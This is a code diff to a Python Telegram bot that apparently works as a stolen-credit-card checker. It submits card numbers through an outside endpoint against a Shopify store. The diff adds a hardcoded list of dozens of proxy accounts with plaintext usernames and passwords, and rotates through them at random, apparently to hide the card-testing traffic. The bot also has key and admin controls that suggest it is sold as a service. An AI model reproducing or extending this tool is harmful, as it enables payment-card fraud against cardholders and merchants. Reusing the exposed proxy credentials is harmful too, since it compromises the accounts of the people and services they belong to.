@@ -3,6 +3,7 @@ import logging
 import uuid
 import time
 import json
+import random
 import httpx
 from telegram import Update
 from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
@@ -19,8 +20,44 @@ OWNER_USERNAME = "@ESCROW2929"
 AUTHORIZED_ADMINS = {8785590284}
 DATA_FILE = "users_data.json"
 
-# Fixed Proxy inside code
-FIXED_PROXY = "brd-customer-hl_54dda161-zone-isp_proxy1-country-us:sxf92a7e5g32@brd.superproxy.io:33335"
+# Complete Proxy List
+PROXY_LIST = [
+    "naveed:Qwerty_123ABC@196.244.48.124:12345",
+    "harishankarchoubey:HvCjWdoIrK6szj8v@136.179.19.164:3128",
+    "naveed:Qwerty_123ABC@196.244.48.26:12345",
+    "llewellynashleybowen:rNXaRJfNPN233zw@136.179.19.164:3128",
+    "naveed:Qwerty_123ABC@196.244.48.126:12345",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ca-tor.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@im-bal.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-syd.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@jp-tok.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@sg-sin.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@it-mil.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-mel.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@id-jak.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-bri.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@nz-auc.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@pl-tor.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@th-ban.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@fr-par.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ph-man.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@dk-cop.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@kr-seo.pvdata.host:8080",
+    "purevpn0s12153504:1LTpwxbCJbEdXo@px460403.pointtoserver.com:10780",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@se-sto.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@fi-esp.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-per.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@hu-bud.pvdata.host:8080",
+    "3700900107896:ratchaburi79@202.41.171.9:2086",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ee-tal.pvdata.host:8080",
+    "s6402011520288:surikan123@202.28.17.8:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ie-dub.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@il-tel.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@hk-hon.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@md-chi.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ro-buk.pvdata.host:8080",
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@lt-sia.pvdata.host:8080"
+]
 
 def load_data():
     if os.path.exists(DATA_FILE):
@@ -99,6 +136,7 @@ async def admin_pannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     panel_message = (
         f"🛠 Admin Panel & Controls\n\n"
         f"• Gateway: Shopify API Connected ✅\n"
+        f"• Total Proxies Loaded: {len(PROXY_LIST)}\n"
         f"• Total Active Users Tracked: {len(ALL_USERS)}\n"
         f"• Total Keys in System: {len(ACTIVE_KEYS)}\n"
         f"• Sub-Admins: {len(SUB_ADMINS)}\n"
@@ -299,8 +337,9 @@ async def process_card_string(card_line, user_full_name):
         bin_info, bank_info, country_info = await get_bin_info(bin_code)
         
         site_url = "https://ripnroll.com"
-        # Using fixed proxy inside API call
-        api_url = f"https://web-production-c2d03.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(FIXED_PROXY)}"
+        selected_proxy = random.choice(PROXY_LIST)
+        
+        api_url = f"https://web-production-c2d03.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(selected_proxy)}"
         
         async with httpx.AsyncClient(timeout=30.0, follow_redirects=True) as client:
             response = await client.get(api_url)
@@ -427,4 +466,4 @@ def main():
 
 if __name__ == "__main__":
     main()
-                     
+                
